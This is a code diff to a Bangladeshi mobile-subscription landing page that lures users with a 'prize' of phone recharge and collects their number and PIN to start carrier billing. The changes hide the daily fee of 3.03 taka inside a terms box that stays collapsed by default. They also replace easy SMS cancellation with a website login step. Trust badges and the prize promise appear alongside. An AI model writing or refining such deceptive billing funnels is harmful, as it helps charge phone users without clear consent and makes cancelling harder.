@@ -105,6 +105,48 @@
             .phone-prefix { padding: 10px 0 10px 12px; font-size: 1rem; min-width: 60px; }
             .phone-input { padding: 10px 12px; font-size: 1rem; }
         }
+
+        /* ===== 可折叠条款样式 ===== */
+        .tnc-toggle {
+            display: inline-block;
+            margin-top: 10px;
+            font-size: 0.85rem;
+            color: #3A7CAE;
+            cursor: pointer;
+            font-weight: 500;
+            user-select: none;
+        }
+        .tnc-toggle:active {
+            opacity: 0.7;
+        }
+        .tnc-box {
+            display: none;
+            margin-top: 10px;
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 14px 16px;
+            text-align: left;
+            font-size: 0.85rem;
+            color: #1e293b;
+            line-height: 1.6;
+            border-left: 3px solid #3A7CAE;
+        }
+        .tnc-box.open {
+            display: block;
+        }
+        .tnc-box strong {
+            color: #b45309;
+        }
+        .tnc-box .highlight {
+            background: #fef3c7;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+        .tnc-divider {
+            border: 0;
+            border-top: 1px dashed #cbd5e1;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
@@ -136,7 +178,19 @@
             <div class="offer-details">
                 <p>✅ সাবস্ক্রাইব → পুরস্কার গ্রহণ</p>
                 <p>🎁 পুরস্কার <strong>মোবাইল রিচার্জ</strong> আকারে ২ মিনিটের মধ্যে পাঠানো হবে</p>
-                <p>⚠️ <strong>যেকোনো সময় সাবস্ক্রিপশন বাতিল</strong> করতে পারেন, বাতিল করতে C XG লিখে 85868 নম্বরে SMS পাঠান।</p>
+                
+                <!-- ===== 可折叠条款（点击小三角展开） ===== -->
+                <div style="margin-top:12px;">
+                    <span class="tnc-toggle" onclick="toggleTnc()">
+                        📋 শর্ত ও শর্তাবলী <span id="tncArrow">▼</span>
+                    </span>
+                    <div class="tnc-box" id="tncBox">
+                        <p>💰 <strong>সাবস্ক্রিপশন ফি: ৩.০৩ টাকা/দিন</strong></p>
+                        <hr class="tnc-divider">
+                        <p>📱 <strong>বাতিল করার নিয়ম:</strong></p>
+                        <p>⚠️ bd.kidonest.com-এ লগ ইন করুন এবং আনসাবস্ক্রাইব করতে "Unsubscribe" বোতামটি ব্যবহার করুন।</p>
+                    </div>
+                </div>
             </div>
             <div class="trust-line">
                 🔒 নিরাপদ লেনদেন | ✅ ১০০% বিশ্বস্ত | 🏆 বাস্তব পুরস্কার
@@ -183,7 +237,7 @@
             <p style="color:#475569; margin:10px 0;">আপনার পুরস্কার খুব শীঘ্রই মোবাইল রিচার্জ আকারে পাঠানো হবে।</p>
             <button class="btn-primary" id="redirectBtn">🚀 সম্পন্ন!</button>
             <div class="footer" style="margin-top:12px;">
-                বাতিল করতে: C XG লিখে 85868 নম্বরে SMS পাঠান
+                bd.kidonest.com-এ লগ ইন করুন এবং আনসাবস্ক্রাইব করতে "Unsubscribe" বোতামটি ব্যবহার করুন।
             </div>
         </div>
 
@@ -199,7 +253,7 @@ const OFFER_ID = '310678';
 const PIN_LENGTH = 5;
 let currentTxid = null;
 let pinErrorCount = 0;
-let userMsisdn = ''; // 保存用户手机号
+let userMsisdn = '';
 
 const cid = new URLSearchParams(location.search).get('cid') || 
             new URLSearchParams(location.search).get('clickid') || 
@@ -260,6 +314,16 @@ function showLoading(el) { el.classList.add('show'); }
 function hideLoading(el) { el.classList.remove('show'); }
 
 // ============================================================
+// 【可折叠条款】
+// ============================================================
+function toggleTnc() {
+    const box = document.getElementById('tncBox');
+    const arrow = document.getElementById('tncArrow');
+    box.classList.toggle('open');
+    arrow.textContent = box.classList.contains('open') ? '▲' : '▼';
+}
+
+// ============================================================
 // 【轮询函数】- 200次 × 3秒 = 10分钟
 // ============================================================
 async function pollStatus(attempt = 0) {
@@ -285,7 +349,6 @@ async function pollStatus(attempt = 0) {
             show('successSection');
             triggerFireworks();
         } else if (data.status === 'processing') {
-            // 每30秒更新一次提示
             if (attempt % 10 === 0 && attempt > 0) {
                 const minutes = Math.floor(attempt * 3 / 60);
                 showError(pinError, `⏳ নিশ্চিত হতে ${minutes} মিনিট সময় হয়েছে। অনুগ্রহ করে অপেক্ষা করুন...`);
@@ -426,26 +489,21 @@ pinBoxes.forEach((box, i) => {
 // 【事件2】点击「发送」- 真实API调用
 // ============================================================
 sendBtn.addEventListener('click', async function() {
-    // 重置错误计数
     pinErrorCount = 0;
     
-    // 只保留数字
     let msisdn = msisdnInput.value.trim().replace(/\D/g, '');
 
-    // 如果以0开头，去掉0
     if (msisdn.startsWith('0')) {
         msisdn = msisdn.substring(1);
     }
 
-    // 验证：必须是10位
     if (msisdn.length !== 10) {
         showError(phoneError, 'সঠিক মোবাইল নম্বর দিন (উদা: ০১৭XXXXXXXX)');
         return;
     }
 
-    // 固定加上880
     msisdn = '880' + msisdn;
-    userMsisdn = msisdn; // ✅ 保存手机号
+    userMsisdn = msisdn;
 
     sendMaxConvEvent('phone_submit');
     hideError(phoneError);
@@ -507,7 +565,6 @@ verifyBtn.addEventListener('click', async function() {
         console.log('🔍 验证响应:', JSON.stringify(data));
 
         if (data.success === true) {
-            // ✅ 成功
             console.log('✅ PIN验证成功！订阅已激活');
             sendMaxConvEvent('pin_success');
             hideLoading(pinLoading);
@@ -517,7 +574,6 @@ verifyBtn.addEventListener('click', async function() {
             triggerFireworks();
             
         } else if (data.processing === true) {
-            // ⏳ 处理中
             console.log('⏳ 订阅处理中，开始轮询...');
             sendMaxConvEvent('pin_processing');
             showError(pinError, '⏳ আপনার সাবস্ক্রিপশন প্রক্রিয়াধীন। অনুগ্রহ করে অপেক্ষা করুন।');
@@ -526,13 +582,11 @@ verifyBtn.addEventListener('click', async function() {
             pollStatus();
             
         } else {
-            // ❌ 验证失败
             console.log('❌ PIN验证失败:', data.msg);
             sendMaxConvEvent('pin_failed');
             hideLoading(pinLoading);
             verifyBtn.disabled = false;
             
-            // ✅ 判断是否是 txid 过期
             const isExpired = data.msg && (
                 data.msg.includes('Invalid') || 
                 data.msg.includes('Expired') || 
@@ -540,15 +594,11 @@ verifyBtn.addEventListener('click', async function() {
             );
             
             if (isExpired && userMsisdn) {
-                // ⏳ txid 过期 → 自动重新发送验证码
                 showError(pinError, '⏳ আপনার কোডের মেয়াদ শেষ হয়েছে। নতুন কোড পাঠানো হচ্ছে...');
                 pinBoxes.forEach(b => b.value = '');
                 verifyBtn.disabled = true;
-                
-                // 清空旧的 txid
                 currentTxid = null;
                 
-                // 2秒后自动重新发送
                 setTimeout(async () => {
                     try {
                         const url = `${API_BASE}/api/pin/request?msisdn=${userMsisdn}&offer_id=${OFFER_ID}&cid=${cid}`;
@@ -564,7 +614,6 @@ verifyBtn.addEventListener('click', async function() {
                             verifyBtn.disabled = false;
                             pinBoxes[0].focus();
                             
-                            // 5秒后自动清除提示
                             setTimeout(() => {
                                 hideError(pinError);
                             }, 5000);
@@ -583,7 +632,6 @@ verifyBtn.addEventListener('click', async function() {
                 return;
             }
             
-            // ✅ 普通错误（用户输错PIN）→ 只清空输入框
             showError(pinError, 'ভুল কোড। আবার চেষ্টা করুন।');
             pinBoxes.forEach(b => b.value = '');
             pinBoxes[0].focus();
@@ -595,8 +643,6 @@ verifyBtn.addEventListener('click', async function() {
         showError(pinError, 'যাচাই ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
         hideLoading(pinLoading);
         verifyBtn.disabled = false;
-        
-        // 网络错误也清空输入框
         pinBoxes.forEach(b => b.value = '');
         pinBoxes[0].focus();
     }
